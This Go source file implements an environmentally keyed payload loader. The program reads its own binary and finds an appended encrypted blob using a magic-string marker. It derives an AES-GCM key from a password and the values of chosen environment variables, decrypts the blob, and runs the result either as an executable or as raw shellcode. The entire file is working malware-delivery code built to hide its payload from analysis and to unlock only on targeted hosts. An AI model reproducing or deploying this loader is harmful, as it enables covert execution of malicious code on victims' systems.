package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	shellcode "github.com/brimstone/go-shellcode"
)

func main() {

	// read in args
	passwordPtr := flag.String("password", "", "optional password")
	flag.Parse()

	// read in self
	imagePath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	selfBytes, err := ioutil.ReadFile(imagePath)
	if err != nil {
		panic(err)
	}

	// find the magic string (last 64 charaters of file)
	magic := string(selfBytes[len(selfBytes)-64:])

	// search image on disk for magic string
	re, err := regexp.Compile(magic)
	if err != nil {
		log.Fatalln(err)
	}

	// get indexes of env list and payload offset
	indexes := re.FindAllIndex(selfBytes, -1)
	envKeyStartIndex := indexes[len(indexes)-3][1]
	envKeyStopIndex := indexes[len(indexes)-2][0]
	payloadOffset := indexes[len(indexes)-2][1]

	// get list of env keys used to construct encryption key
	envKeyStr := string(selfBytes[envKeyStartIndex:envKeyStopIndex])
	envKeys := strings.Split(envKeyStr, ":")

	// last envKey is actually the payload type
	payloadType := envKeys[len(envKeys)-1]
	envKeys = envKeys[:len(envKeys)-1]

	encKey := fmt.Sprintf("password:%s", *passwordPtr)
	for _, v := range envKeys {
		encKey = fmt.Sprintf("%s:%s:%s", encKey, strings.ToLower(v), strings.ToLower(os.Getenv(v)))
	}
	encKeySha256 := sha256.Sum256([]byte(encKey))

	// create and launch payload
	ciphertext := selfBytes[payloadOffset : len(selfBytes)-64]

	// Decrypt Payload
	c, err := aes.NewCipher(encKeySha256[:])
	if err != nil {
		log.Fatalln(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		log.Fatalln(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		log.Fatalln(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	payload, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		log.Fatalln(err)
	}

	// Execute payload
	if payloadType == "executable" {
		launchExe(payload)
	} else if payloadType == "shellcode" {
		shellcode.Run(payload)
	} else {
		log.Fatalf("Unknown payload type: %s", payloadType)
	}

}
